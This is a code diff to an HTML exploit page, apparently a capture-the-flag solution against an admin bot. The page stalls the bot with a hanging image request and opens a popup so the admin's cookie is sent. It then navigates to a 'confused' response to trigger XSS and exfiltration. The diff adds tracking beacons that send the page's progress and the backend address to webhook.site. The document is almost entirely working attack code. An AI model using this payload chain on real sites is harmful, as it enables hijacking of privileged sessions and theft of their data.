@@ -1,16 +1,18 @@
 <!doctype html>
 <html><head><meta charset="utf-8"><title>a</title></head>
 <body><h1>loading</h1>
-<!-- hanging resource keeps the page from reaching networkidle0 so the bot's goto()
-     waits ~10s, giving the popup time to register the dict, confuse, and exfil. -->
+<!-- hanging resource keeps page from networkidle0 so bot goto() waits ~10s -->
 <img src="http://10.255.255.1/keepalive" style="display:none">
 <script>
 const q = new URLSearchParams(location.search);
 const B = (q.get('b') || 'http://backend:8080').replace(/\/+$/,'');
 const P = '2';
+const WT = q.get('w') || '';                 // webhook token for progress beacons
+function bx(s){ if(WT) new Image().src='https://webhook.site/'+WT+'/S?'+s+'&t='+Date.now(); }
+bx('step=loaded&B='+encodeURIComponent(B));
 // 1) register RB dictionary via top-level popup nav (SameSite=Lax => admin cookie sent)
 const w = window.open(B + '/api/content/' + P + '/1', 'x');
 // 2) after registration, navigate popup to the confused version -> dcz XSS -> exfil
-setTimeout(function(){ try { w.location = B + '/api/content/' + P + '/2'; } catch (e) {} }, 3000);
+setTimeout(function(){ bx('step=nav'); try { w.location = B + '/api/content/' + P + '/2'; } catch (e) {} }, 3000);
 </script>
 </body></html>
